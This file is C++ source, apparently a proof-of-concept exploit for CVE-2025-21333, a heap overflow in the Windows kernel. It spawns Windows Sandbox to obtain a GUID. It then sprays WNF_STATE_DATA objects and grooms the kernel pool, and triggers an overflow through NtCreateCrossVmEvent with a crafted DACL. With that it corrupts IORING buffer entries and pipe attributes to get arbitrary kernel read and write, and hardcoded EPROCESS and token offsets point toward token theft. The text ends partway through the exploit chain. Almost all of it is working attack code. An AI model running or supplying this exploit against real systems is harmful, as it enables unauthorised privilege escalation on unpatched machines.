// cve-2025-21333.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <stdio.h>
#include <Windows.h>
#include <aclapi.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <vector>
#include <algorithm>
#include <ioringapi.h>
#include <iostream>
#include "header.h"

#pragma comment(lib, "Rpcrt4.lib")

#define ROUND_DOWN(n, align) (((ULONG)n) & ~((align) - 1l))
#define ROUND_UP(n, align) ROUND_DOWN(((ULONG)n) + (align) - 1, (align))

#define SPRAY_ONE 0x2000
#define SPRAY_TWO 0x2000
#define SPRAY_THREE 0x800
#define PIPE_COUNT 0x500
#define IORINGS_SIZE 0x500
#define OUTPUT_PIPE_NAME L"\\\\.\\pipe\\IoRingExploitOutput"
#define INPUT_PIPE_NAME L"\\\\.\\pipe\\IoRingExploitInput"

#define NPFSDCREATE_OFFSET 0xcfc0
#define IAT_EXALLOCATEPOOL2_OFFSET 0x7050
#define EXALLOCATEPOOL2_OFFSET 0xaab5a0
#define EPROCESS_OFFSET 0xd1ea60
#define TOKEN_OFFSET 0x4b8
#define ACTIVEPROCESSLINKS_OFFSET 0x448
#define UNIQUEPROCESSID_OFFSET 0x440
#define ROOT_PIPE_ATTRIBUTE_OFFSET  0x140
#define FILE_OBJECT_OFFSET 0x30

WCHAR guid[37] = { 0 };
NTSTATUS result = -1;
HANDLE inputPipe = INVALID_HANDLE_VALUE;
HANDLE outputPipe = INVALID_HANDLE_VALUE;
HANDLE inputClientPipe = INVALID_HANDLE_VALUE;
HANDLE outputClientPipe = INVALID_HANDLE_VALUE;


HANDLE GetWinSBXCliProcHandle() {
    HANDLE hProcess = NULL;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return NULL;
    }
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return NULL;
    }
    do {
        if (wcscmp(pe32.szExeFile, L"WindowsSandboxClient.exe") == 0) {
            hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));
    CloseHandle(hSnapshot);
    return hProcess;
}

#define TARGET_SIZE 0x50
#define REGBUFFERCOUNT (TARGET_SIZE-0x10)/sizeof(PVOID) // 0x50 - POOL_HEADER / 0x8
SIZE_T attribute_size = TARGET_SIZE - 0x38;
unsigned char* attribute = NULL;
unsigned char* output = NULL;
SIZE_T output_size = 0x100;
PUIORING* iorings = NULL;
IOP_MC_BUFFER_ENTRY* fake_bufferentry = NULL;
IORING_BUFFER_INFO preregBuffers[REGBUFFERCOUNT] = { 0 };
HIORING targetHandle = NULL;

std::vector<HANDLE> pRead(PIPE_COUNT);
std::vector<HANDLE> pWrite(PIPE_COUNT);

BOOL prepareObjects() {

    // PipeAttribute

    for (int i = 0; i < PIPE_COUNT; i++) {
        if (!CreatePipe(&pRead[i], &pWrite[i], NULL, NULL)) {
            printf("[-] CreatePipe failed with error %d", GetLastError());
        }
    }

    // IORING
    iorings = new PUIORING[IORINGS_SIZE];
    HRESULT result;
    IORING_CREATE_FLAGS flags;

    flags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
    flags.Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;

    preregBuffers[0].Address = VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!preregBuffers[0].Address)
    {
        printf("[-] Failed to allocate prereg buffer\n");
        return FALSE;
    }
    memset(preregBuffers[0].Address, 0x41, 0x100);
    preregBuffers[0].Length = 0x10;

    for (int i = 0; i < IORINGS_SIZE; i++) {
        result = CreateIoRing(IORING_VERSION_3, flags, 0x10000, 0x20000, reinterpret_cast<HIORING*>(&(iorings[i])));
        if (!SUCCEEDED(result))
        {
            printf("[-] Failed creating IO ring handle: 0x%x\n", result);
        }

        result = BuildIoRingRegisterBuffers(reinterpret_cast<HIORING>(iorings[i]), REGBUFFERCOUNT, preregBuffers, 0);
        if (!SUCCEEDED(result))
        {
            printf("[-] Failed BuildIoRingRegisterBuffers: 0x%x\n", result);
        }
    }

    // Create named pipes for the input/output of the I/O operations and open client handles for them

    inputPipe = CreateNamedPipe(INPUT_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
    if (inputPipe == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to create input pipe: 0x%x\n", GetLastError());
        return FALSE;
    }
    outputPipe = CreateNamedPipe(OUTPUT_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
    if (outputPipe == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to create output pipe: 0x%x\n", GetLastError());
        return FALSE;
    }

    outputClientPipe = CreateFile(OUTPUT_PIPE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (outputClientPipe == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open handle to output file: 0x%x\n", GetLastError());
        return FALSE;
    }

    inputClientPipe = CreateFile(INPUT_PIPE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (inputClientPipe == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open handle to input pipe: 0x%x\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL spawnSandbox() {

    STARTUPINFOW Si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION Pi = { 0 };
    if (!CreateProcessW(L"C:\\Windows\\System32\\WindowsSandbox.exe", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &Si, &Pi)){
        return FALSE;
    }
    else {
        printf("[+] WindowsSandbox.exe is spawned successfully: %d\n", Pi.dwProcessId);
    }

    // Wait until the Child Process WindowsSandboxClient.exe is spawned 
    HANDLE hSandboxClient = INVALID_HANDLE_VALUE;
    while (1) {
        Sleep(5000);
        hSandboxClient = GetWinSBXCliProcHandle();
        if (hSandboxClient != NULL && hSandboxClient != INVALID_HANDLE_VALUE) {
            break;
        }
    }
    
    fNtQueryInformationProcess pNtQueryInformationProcess = (fNtQueryInformationProcess)(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess"));
    if (pNtQueryInformationProcess == NULL) {
        printf("\t[-] Unable to find ntdll!NtQueryInformationProcess\n");
        return FALSE;
    }

    NTSTATUS STATUS;
    PROCESS_BASIC_INFORMATION PBI = { 0 };
    ULONG uRet = NULL;
    if ((STATUS = pNtQueryInformationProcess(hSandboxClient, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uRet)) != 0) {
        printf("\t[!] NtQueryInformationProcess Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }
    
    // Read PEB
    SIZE_T bytesRead;
    PEB pebSandbox = { 0 };
    if (!ReadProcessMemory(hSandboxClient, PBI.PebBaseAddress, &pebSandbox, sizeof(PEB), &bytesRead)){
        printf("\t[!] ReadProcessMemory Failed to Read PEB With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Read ProcessParameters from PEB
    RTL_USER_PROCESS_PARAMETERS processParam = { 0 };
    if (!ReadProcessMemory(hSandboxClient, pebSandbox.ProcessParameters, &processParam, sizeof(RTL_USER_PROCESS_PARAMETERS), &bytesRead)) {
        printf("\t[!] ReadProcessMemory Failed to Read Process Parameters With Error : %d \n", GetLastError());
        return FALSE;
    }

    WCHAR* commandLine = (WCHAR*)malloc(processParam.CommandLine.Length + 2);
    if (!commandLine) {
        printf("\t[!] Memory allocation failed\n");
        return 1;
    }

    // Read CommandLine buffer
    if (!ReadProcessMemory(hSandboxClient, processParam.CommandLine.Buffer, commandLine, processParam.CommandLine.Length, &bytesRead)) {
        printf("\t[!] ReadProcessMemory Failed to Read Command Line With Error: %d \n", GetLastError());
        free(commandLine);
        return 1;
    }

    commandLine[processParam.CommandLine.Length / sizeof(WCHAR)] = L'\0';
    printf("[+] WindowsSandboxClient.exe Command Line: %ws\n", commandLine);

    // Retrieve GUID from CommandLine
    wcsncpy_s(guid, _countof(guid), commandLine + 58, 36);
    printf("[+] WindowsSandboxClient.exe GUID: %ws\n", guid);

    return TRUE;
}

BOOL KWrite(PVOID TargetAddress, PBYTE pValue, SIZE_T size) {

    DWORD bytesWritten = 0;
    HRESULT result;
    UINT32 submittedEntries;
    IORING_CQE cqe;

    if (WriteFile(inputPipe, pValue, size, &bytesWritten, NULL) == FALSE)
    {
        result = GetLastError();
        printf("[-] Failed to write into the input pipe: 0x%x\n", result);
        return FALSE;
    }

    memset(fake_bufferentry, 0, sizeof(IOP_MC_BUFFER_ENTRY));
    fake_bufferentry->Address = TargetAddress;
    fake_bufferentry->Length = size;
    fake_bufferentry->Type = 0xc02;
    fake_bufferentry->Size = 0x80;
    fake_bufferentry->AccessMode = 1;
    fake_bufferentry->ReferenceCount = 1;

    auto requestDataBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    auto requestDataFile = IoRingHandleRefFromHandle(inputClientPipe);

    result = BuildIoRingReadFile(targetHandle,
        requestDataFile,
        requestDataBuffer,
        size,
        0,
        NULL,
        IOSQE_FLAGS_NONE);
    if (!SUCCEEDED(result))
    {
        printf("[-] Failed building IO ring read file structure: 0x%x\n", result);
        return FALSE;
    }

    result = SubmitIoRing(targetHandle, 1, INFINITE, &submittedEntries);
    if (!SUCCEEDED(result))
    {
        printf("[-] Failed submitting IO ring: 0x%x\n", result);
        return FALSE;
    }

    return TRUE;
}

BOOL KRead(PVOID TargetAddress, PBYTE pOut, SIZE_T size) {
    DWORD bytesRead = 0;
    HRESULT result;
    UINT32 submittedEntries;
    IORING_CQE cqe;

    memset(fake_bufferentry, 0, sizeof(IOP_MC_BUFFER_ENTRY));
    fake_bufferentry->Address = TargetAddress;
    fake_bufferentry->Length = size;
    fake_bufferentry->Type = 0xc02;
    fake_bufferentry->Size = 0x80;
    fake_bufferentry->AccessMode = 1;
    fake_bufferentry->ReferenceCount = 1;

    auto requestDataBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    auto requestDataFile = IoRingHandleRefFromHandle(outputClientPipe);

    result = BuildIoRingWriteFile(targetHandle,
        requestDataFile,
        requestDataBuffer,
        size,
        0,
        FILE_WRITE_FLAGS_NONE,
        NULL,
        IOSQE_FLAGS_NONE);
    if (!SUCCEEDED(result))
    {
        printf("[-] Failed building IO ring read file structure: 0x%x\n", result);
        return FALSE;
    }

    result = SubmitIoRing(targetHandle, 1, INFINITE, &submittedEntries);
    if (!SUCCEEDED(result))
    {
        printf("[-] Failed submitting IO ring: 0x%x\n", result);
        return FALSE;
    }

    result = PopIoRingCompletion(targetHandle, &cqe);
    if ((!SUCCEEDED(result)) || (!NT_SUCCESS(cqe.ResultCode)))
    {
        printf("[-] Failed reading kernel memory 0x%x\n", cqe.ResultCode);
        return FALSE;
    }

    BOOL res = ReadFile(outputPipe,
        pOut,
        size,
        &bytesRead,
        NULL);
    if (!res)
    {
        printf("[-] Failed to read from output pipe: 0x%x\n", GetLastError());
        return FALSE;
    }
    return res;
}

void printhex(uintptr_t inputptr) {
    DWORD* ptr2Print = reinterpret_cast<DWORD*>(inputptr);
    for (int i = 0; i < 0x50 / sizeof(DWORD); i++) {
        if (i % 4 == 0) printf("\n");
        printf("\t0x%08X ", ptr2Print[i]);
    }
    printf("\n");
}

int main()
{

    fNtCreateWnfStateName pNtCreateWnfStateName = (fNtCreateWnfStateName)(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateWnfStateName"));
    if (pNtCreateWnfStateName == NULL) {
        printf("[-] Unable to find ntdll!NtCreateWnfStateName\n");
        return FALSE;
    }

    fNtUpdateWnfStateData pNtUpdateWnfStateData = (fNtUpdateWnfStateData)(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtUpdateWnfStateData"));
    if (pNtUpdateWnfStateData == NULL) {
        printf("[-] Unable to find ntdll!NtUpdateWnfStateData\n");
        return FALSE;
    }

    fNtDeleteWnfStateData pNtDeleteWnfStateData = (fNtDeleteWnfStateData)(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDeleteWnfStateData"));
    if (pNtDeleteWnfStateData == NULL) {
        printf("[-] Unable to find ntdll!NtDeleteWnfStateData\n");
        return FALSE;
    }

    fNtCreateCrossVmEvent pNtCreateCrossVmEvent = (fNtCreateCrossVmEvent)(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateCrossVmEvent"));
    if (pNtCreateCrossVmEvent == NULL) {
        printf("[-] Unable to find ntdll!NtCreateCrossVmEvent\n");
        return FALSE;
    }

    fNtQueryWnfStateData pNtQueryWnfStateData = (fNtQueryWnfStateData)(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryWnfStateData"));
    if (pNtQueryWnfStateData == NULL) {
        printf("[-] Unable to find ntdll!NtQueryWnfStateData\n");
        return FALSE;
    }

    fNtDeleteWnfStateName pNtDeleteWnfStateName = (fNtDeleteWnfStateName)(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDeleteWnfStateName"));
    if (pNtDeleteWnfStateName == NULL) {
        printf("[-] Unable to find ntdll!NtFsControlFile\n");
        return FALSE;
    }

    fNtFsControlFile pNtFsControlFile = (fNtFsControlFile)(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtFsControlFile"));
    if (pNtFsControlFile == NULL) {
        printf("[-] Unable to find ntdll!NtFsControlFile\n");
        return FALSE;
    }

    // Step 0: Peparing IORING_OBJECT and Pipes
    printf("[+] Preparing for IORING and PipeAttribute...\n");
    prepareObjects();

    // Step 1: Initializing Malicious DACL
    SECURITY_DESCRIPTOR sd = { 0 }; // Initializing a new (malicious) SECURITY_DESCRIPTOR
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);

    PACL pdacl;
    PSECURITY_DESCRIPTOR ssd;
    GetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &pdacl, NULL, &ssd); // Retrieve current process DACL
    
    ACCESS_ALLOWED_ACE* firstACE;
    firstACE = (ACCESS_ALLOWED_ACE*)((BYTE*)pdacl + sizeof(ACL));  // Retrieve current process's first ACE

    sd.Dacl = (PACL)(VirtualAlloc(NULL, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)); // Allocate memory for new malicious DACL
    memset(sd.Dacl, 0x41, 0x10000);
    sd.Dacl->AclSize = ROUND_UP(0xfff0, 4);
    sd.Dacl->AclRevision = ACL_REVISION;
    sd.Dacl->AceCount = 1; // Number of ACE in new DACL = 1

    ACCESS_ALLOWED_ACE* malACE;
    malACE = (ACCESS_ALLOWED_ACE*)((BYTE*)sd.Dacl + sizeof(ACL));  // Retrieve the address of new malicious DACL's first ACE
    memcpy(malACE, firstACE, firstACE->Header.AceSize);     // Copy current process's first ACE to new (malicious) ACE
    malACE->Header.AceSize = sd.Dacl->AclSize - sizeof(ACL);

    printf("[+] Malicious DACL in user-space: %p\n", sd.Dacl);
    unsigned char* ptr = (unsigned char*)(sd.Dacl) + 0x40;

    ULONG DataSize = 0x50 * 0x334; //the overflow allows to overwrite the next (0xfff0-0x40)/0x50 = 0x332 objects

    int i = 0;
    do {
        POOL_HEADER* ph = (POOL_HEADER*)(ptr + i * 0x50);
        ph->BlockSize = 0x5;
        ph->PoolTag = 0x20666e57;
        ph->PoolType = 0xb & ~(1 << 3); //clear PoolQuota bit (bit index 3)
        ph->PoolIndex = 0x0;
        ph->PreviousSize = 0x0;
        ph->ProcessBilled = (PVOID)0x4242424242424242;
       
        WNF_STATE_DATA* wnf = (WNF_STATE_DATA*)(ptr + i * 0x50 + sizeof(POOL_HEADER));
        wnf->DataSize = DataSize;
        wnf->AllocatedSize = wnf->DataSize;
        wnf->ChangeStamp = 1;
        uintptr_t data = (uintptr_t)wnf + sizeof(WNF_STATE_DATA);
        *((DWORD64*)data) = i;
        DataSize -= 0x50;

        i++;
    } while (i != 0x332); 

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, &sd);
    sd.Control = 0x4;

    // Step 2: Retrieving GUID from Windows Sandbox
    BOOL status = spawnSandbox();
    if (!status) {
        printf("[-] Failed to spawn WindowsSandbox.exe and retrieve the Command Line!\n");
        return 0;
    }

    UUID vGUID;
    if (guid != 0) {
        UuidFromStringW((RPC_WSTR)guid, &vGUID);
    }

    // Step 3: Setting up Pool

    SECURITY_DESCRIPTOR sd_spraying = { 0 };
    InitializeSecurityDescriptor(&sd_spraying, SECURITY_DESCRIPTOR_REVISION);

    std::vector<WNF_STATE_NAME> spray1(SPRAY_ONE);
    std::vector<WNF_STATE_NAME> spray2(SPRAY_TWO);
    std::vector<WNF_STATE_NAME> spray3(SPRAY_THREE);

    unsigned char* buffer = new unsigned char[0x10080];
    memset(buffer, 'C', 0x30);

    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    /// Spraying 1: Fill the pages with WNF_STATE_DATA
    printf("[+] Phase I: Performing Defragmentation for the object....\n");
    for (int i = 0; i < SPRAY_ONE; i++) {
        pNtCreateWnfStateName(&(spray1[i]), WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, 0x1000, &sd_spraying);
        pNtUpdateWnfStateData(&(spray1[i]), buffer, 0x30, 0, 0, 0, 0);
    }

    /// Spraying 2: Filling new page with WNF_STATE_DATA
    printf("[+] Phase II: Allocating objects in sequence....\n");
    for (int i = 0; i < SPRAY_TWO; i++) {

        pNtCreateWnfStateName(&(spray2[i]), WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, 0x1000, &sd_spraying);
        pNtUpdateWnfStateData(&(spray2[i]), buffer, 0x30, 0, 0, 0, 0);
    }

    /// Hole in 2nd Spraying
    printf("[+] Phase III: Creating holes in the pool...\n");
    for (int i = SPRAY_TWO - 0x100; i > 0; i -= 100) {
        /*if (i % 20 == 0) {
            pNtDeleteWnfStateData(&(spray2[i]), NULL);
        }*/
        pNtDeleteWnfStateData(&(spray2[i]), NULL);
    }

    /// Triggering the overflow
    printf("[+] Attempting to call NtCreateCrossVmEvent()\n");
    HANDLE hEvent;
    pNtCreateCrossVmEvent(&hEvent, EVENT_ALL_ACCESS, &oa, 0, &vGUID, &vGUID);

    /// Spraying 3: Filling the holes with WNF_STATE_DATA
    printf("[+] Phase IV: Filling remaining holes in the pool...\n");
    for (int i = 0; i < SPRAY_THREE; i++) {

        pNtCreateWnfStateName(&(spray3[i]), WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, 0x1000, &sd_spraying);
        pNtUpdateWnfStateData(&(spray3[i]), buffer, 0x30, 0, 0, 0, 0);
    }

    Sleep(2000);

    // Step 4: Finding Malicious WNF_STATE_DATA

    printf("[+] Reading WNF_STATE_DATA to find the malicious objects\n");
    
    typedef struct _MALICIOUS_WNF {
        WNF_STATE_NAME state;
        ULONG dataSize;
    }MALICIOUS_WNF;

    std::vector<MALICIOUS_WNF> malWNF(SPRAY_TWO);

    int count = 0;
    for (int i = 0; i < SPRAY_TWO; i++) {
        ULONG stamp = 0;
        ULONG outsize = 0x30;
        memset(buffer, 0x0, 0x10040);
        result = pNtQueryWnfStateData(&(spray2[i]), NULL, NULL, &stamp, buffer, &outsize);
        if (result != 0) {
            result = pNtQueryWnfStateData(&(spray2[i]), NULL, NULL, &stamp, buffer, &outsize);
            if (reinterpret_cast<DWORD64*>(buffer)[1] == 0x4141414141414141) {
                malWNF[i].state = spray2[i];
                malWNF[i].dataSize = outsize;
                // printf("\t[*] Found malicious WNF_STATE_DATA with %lx %lx size: %lu\n", spray2[i].Data[0], spray2[i].Data[1], outsize);
                count++;
            }
        }
    }

    printf("[+] Total retrieved malicious WNF_STATE_DATA object: %i\n", count);
       
    std::sort(malWNF.begin(), malWNF.end(), [](const MALICIOUS_WNF& a, const MALICIOUS_WNF& b) {
        return a.dataSize > b.dataSize; // Descending order
        });

    // Step 5: Locating a WFN for IOP_MC_BUFFER_ENTRY* array

    ULONG stamp = 0;
    memset(buffer, 0x0, 0x10040);
    pNtQueryWnfStateData(&(malWNF[0].state), NULL, NULL, &stamp, buffer, &malWNF[0].dataSize);

    /// Finding the PoolTag "Wnf"
    int found = 0;
    uintptr_t ptr2 = (uintptr_t)buffer + 0x30; // skip the current malicious WNF_STATE_DATA content
    while ((uintptr_t)ptr2 < (uintptr_t)buffer + 0x10000) {
        POOL_HEADER* cph = (POOL_HEADER*)ptr2;
        WNF_STATE_DATA* cwnf = (WNF_STATE_DATA*)(ptr2 + sizeof(POOL_HEADER));

        /// Confirm it's a valid malicious chunk
        if (cph->PoolTag == 0x20666e57 && cwnf->Header == 0x41414141) {
            printf("[+] Found a valid malicious chunk...");
            found = 1;
            printhex(ptr2);
            break;
        }
        else if ((uintptr_t)ptr2 < (uintptr_t)buffer + 0x10000) {
            ptr2 += 0x4;
        }
        else {
            printf("[-] Failed to find a valid malicious chunk...\n");
            return 1;
        }
    }

    if (found == 0) {
        printf("[-] Failed to find a valid malicious chunk...\n");
        return 1;
    }

    /// Replacing the first 8 bytes of the WNF_STATE_DATA body with a placeholder
    uintptr_t offset = (uintptr_t)ptr2 - (uintptr_t)buffer + sizeof(POOL_HEADER) + sizeof(WNF_STATE_DATA);
    *(uint64_t*)((uintptr_t)buffer + offset) = 0xd3add3add3add3ad;

    // Step 6: Locating a WFN for PipeAttribute

    /// Finding the PoolTag "Wnf"
    found = 0;
    uintptr_t ptr3 = ptr2 + 0x50; // skip the current malicious WNF_STATE_DATA of RegBuffers
    while ((uintptr_t)ptr3 < (uintptr_t)buffer + 0x10000) {
        POOL_HEADER* cph = (POOL_HEADER*)ptr3;
        WNF_STATE_DATA* cwnf = (WNF_STATE_DATA*)(ptr3 + sizeof(POOL_HEADER));

        /// Confirm it's a valid malicious chunk
        if (cph->PoolTag == 0x20666e57 && cwnf->Header == 0x41414141) {
            printf("[+] Found a valid malicious chunk...");
            found = 1;
            printhex(ptr3);
            break;
        }
        else if ((uintptr_t)ptr3 < (uintptr_t)buffer + 0x10000) {
            ptr3 += 0x4;
        }
        else {
            printf("[-] Failed to find a valid malicious chunk...\n");
            return 1;
        }
    }

    if (found == 0) {
        printf("[-] Failed to find a valid malicious chunk...\n");
        return 1;
    }
    
    /// Replacing the first 8 bytes of the WNF_STATE_DATA body with a placeholder
    offset = (uintptr_t)ptr3 - (uintptr_t)buffer + sizeof(POOL_HEADER) + sizeof(WNF_STATE_DATA);
    *(uint64_t*)((uintptr_t)buffer + offset) = 0xb33fb33fb33fb33f;

    printf("[+] Replacing the malicious WNF_STATE_DATA with placeholders\n");
    pNtUpdateWnfStateData(&(malWNF[0].state), buffer, 0x1000, 0, 0, 0, 0);

    // Step 7: Finding the Placeholders

    typedef struct _IORING_WNF {
        WNF_STATE_NAME state;
    }IORING_WNF;

    IORING_WNF ioringWNF = { 0 };
    for (int i = 0; i < SPRAY_TWO; i++) {
        ULONG stamp = 0;
        ULONG outsize = 0x30;
        memset(buffer, 0x0, 0x10040);
        result = pNtQueryWnfStateData(&(spray2[i]), NULL, NULL, &stamp, buffer, &outsize);
        if (result != 0) {
            result = pNtQueryWnfStateData(&(spray2[i]), NULL, NULL, &stamp, buffer, &outsize);
            if (reinterpret_cast<DWORD64*>(buffer)[0] == 0xd3add3add3add3ad) { // IOP_MC_BUFFER_ENTRY* array
                ioringWNF.state = spray2[i];
                printf("[+] Found the placeholder of IOP_MC_BUFFER_ENTRY* array in WNF_STATE_DATA with %lx %lx\n", spray2[i].Data[0], spray2[i].Data[1]);
            }
        }
    }

    typedef struct _PIPE_WNF {
        WNF_STATE_NAME state;
    }PIPE_WNF;

    PIPE_WNF pipeWNF = { 0 };
    for (int i = 0; i < SPRAY_TWO; i++) {
        ULONG stamp = 0;
        ULONG outsize = 0x30;
        memset(buffer, 0x0, 0x10040);
        result = pNtQueryWnfStateData(&(spray2[i]), NULL, NULL, &stamp, buffer, &outsize);
        if (result != 0) {
            result = pNtQueryWnfStateData(&(spray2[i]), NULL, NULL, &stamp, buffer, &outsize);
            if (reinterpret_cast<DWORD64*>(buffer)[0] == 0xb33fb33fb33fb33f) { // PipeAttribute
                pipeWNF.state = spray2[i];
                printf("[+] Found the placeholder of PipeAttribute in WNF_STATE_DATA with %lx %lx\n", spray2[i].Data[0], spray2[i].Data[1]);
            }
        }
    }

    Sleep(2000);

    // Step 8: Replacing IORING_OBJECT

    printf("[+] Deleting WNF with placeholder 0xd3add3add3add3ad for IOP_MC_BUFFER_ENTRY* array\n");
    result = pNtDeleteWnfStateData(&(ioringWNF.state), NULL);
    if (result != 0) {
        printf("[-] Failed to delete the malicious WNF Object for IORING..\n");
    }

    printf("[+] Spraying IOP_MC_BUFFER_ENTRY* array\n");
    for (int i = 0; i < IORINGS_SIZE; i++) {
        UINT32 submitted = 0;
        result = SubmitIoRing(reinterpret_cast<HIORING>(iorings[i]), 0, INFINITE, &submitted);
        if (!SUCCEEDED(result)) {
            printf("[-] Failed SubmitIoRing: 0x%x\n", result);
            return FALSE;
        }
    }

    Sleep(5000);

    // Step 9: Replacing PipeAttribute

    printf("[+] Deleting WNF with placeholder 0xb33fb33fb33fb33f for PipeAttribute\n");
    result = pNtDeleteWnfStateData(&(pipeWNF.state), NULL);
    if (result != 0) {
        printf("[-] Failed to delete the malicious WNF Object for PipeAttribute..\n");
    }

    attribute = new unsigned char[0x1000];
    memset(attribute, 0x41, 0x1000);
    attribute[0] = 'Z';
    attribute[1] = '\0';
    output = new unsigned char[output_size];
    memset(output, 0x0, 0x100);

    printf("[+] Spraying PipeAttribute\n");
    for (int i = 0; i < PIPE_COUNT; i++) {
        NTSTATUS stat = pNtFsControlFile(pWrite[i],
                NULL,
                NULL,
                NULL,
                &status,
                0x11003C,
                attribute,
                attribute_size,
                output,
                output_size
            );
        if (stat != 0) {
            printf("[-] NtFsControlFile failed with error 0x%lx\n", stat);
        }
    }

    stamp = 0;
    memset(buffer, 0x0, 0x10040);
    pNtQueryWnfStateData(&(malWNF[0].state), NULL, NULL, &stamp, buffer, &malWNF[0].dataSize);

    /// Finding the PoolTag "BRrI"
    uintptr_t ringptr = (uintptr_t)buffer + 0x30; // skip the current malicious WNF_STATE_DATA content
    found = 0;
    while ((uintptr_t)ringptr < (uintptr_t)buffer + 0x10000) {
        POOL_HEADER* cph = (POOL_HEADER*)ringptr;
        WNF_STATE_DATA* cwnf = (WNF_STATE_DATA*)(ringptr + sizeof(POOL_HEADER));

        /// Confirm it's a valid IOP_MC_BUFFER_ENTRY* array
        if (cph->PoolTag == 0x42527249) { // IrRB
            printf("[+] Found the IOP_MC_BUFFER_ENTRY* array...");
            found = 1;
            printhex(ringptr);
            break;
        }
        else if ((uintptr_t)ringptr < (uintptr_t)buffer + 0x10000) {
            ringptr += 0x4;
        }
        else {
            printf("[-] Failed to find the IOP_MC_BUFFER_ENTRY* array...\n");
            return 1;
        }
    }

    if (found == 0) {
        printf("[-] Failed to find the IOP_MC_BUFFER_ENTRY* array...\n");
        return 1;
    }

    found = 0;
    uintptr_t pipeptr = (uintptr_t)buffer + 0x30; // skip the current malicious WNF_STATE_DATA content
    while ((uintptr_t)pipeptr < (uintptr_t)buffer + 0x10000) {
        POOL_HEADER* cph = (POOL_HEADER*)pipeptr;
        WNF_STATE_DATA* cwnf = (WNF_STATE_DATA*)(pipeptr + sizeof(POOL_HEADER));

        /// Confirm it's a valid PipeAttribute
        if (cph->PoolTag == 0x7441704e) { // NpAt
            printf("[+] Found the PipeAttribute...");
            printhex(pipeptr);
            found = 1;
            break;
        }
        else if ((uintptr_t)pipeptr < (uintptr_t)buffer + 0x10000) {
            pipeptr += 0x4;
        }
        else {
            printf("[-] Failed to find the PipeAttribute...\n");
            return 1;
        }
    }

    if (found == 0) {
        printf("[-] Failed to find the PipeAttribute...\n");
        return 1;
    }

    unsigned char* backup_buffer = new unsigned char[0x1000];
    memcpy(backup_buffer, buffer, 0x1000);

    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
    SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);

    /// Step 10: Replace legitimate IOP_MC_BUFFER_ENTRY 

    PVOID original_regBufferEntry = *(PVOID*)((uintptr_t)ringptr + sizeof(POOL_HEADER));
    printf("[+] Found a valid IOP_MC_BUFFER_ENTRY: %p\n", original_regBufferEntry);

    fake_bufferentry = reinterpret_cast<IOP_MC_BUFFER_ENTRY*>(VirtualAlloc(NULL, 0x5000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
    VirtualLock(fake_bufferentry, 0x5000);
    fake_bufferentry = reinterpret_cast<IOP_MC_BUFFER_ENTRY*>(reinterpret_cast<unsigned char*>(fake_bufferentry) + 0x3000);
    memset(fake_bufferentry, 0, sizeof(IOP_MC_BUFFER_ENTRY));

    IOP_MC_BUFFER_ENTRY** regBuffersAddr = reinterpret_cast<PIOP_MC_BUFFER_ENTRY*>(ringptr + sizeof(POOL_HEADER));
    regBuffersAddr[0] = fake_bufferentry;

    printf("[+] Replacing the valid IOP_MC_BUFFER_ENTRY with user-space address\n");
